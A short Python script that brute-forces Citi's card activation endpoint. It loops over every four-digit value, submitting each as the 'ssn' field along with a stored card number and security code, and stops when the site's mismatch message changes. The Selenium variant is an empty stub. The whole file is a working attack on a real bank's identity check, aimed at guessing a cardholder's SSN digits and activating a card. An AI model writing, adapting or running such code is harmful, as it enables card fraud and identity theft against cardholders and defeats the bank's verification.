import requests
import config
from permute import permute

CONTINUE_URL = 'https://www.cardactivation.citi.com/Home/Continue1'
POSSIBLE_PIN_DIGITS = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
PIN_DIGIT_COUNT = 4

card_number = config.card_number
security_code = config.security_code

possible_pins = permute(POSSIBLE_PIN_DIGITS, PIN_DIGIT_COUNT)


def post_request_brute_force(possible_pins, card_number, security_code, url):
    for pin in possible_pins:
        request_payload = {
            'cardNumber': card_number,
            'securityCode': security_code,
            'ssn': pin
        }

        continue_response = requests.post(CONTINUE_URL, json=request_payload)
        continue_response_payload = continue_response.json()
        status_code = continue_response_payload['Status']
        msg = continue_response_payload['Msg']

        print(continue_response_payload)
        print(pin)

        if status_code != '999' or msg != 'The information you entered does not match our records. Please try again or contact Citi Customer Service at the number on the activation sticker or on the back of your card.':
            return


def selenium_brute_force(possible_pins, card_number, security_code, url):
    return
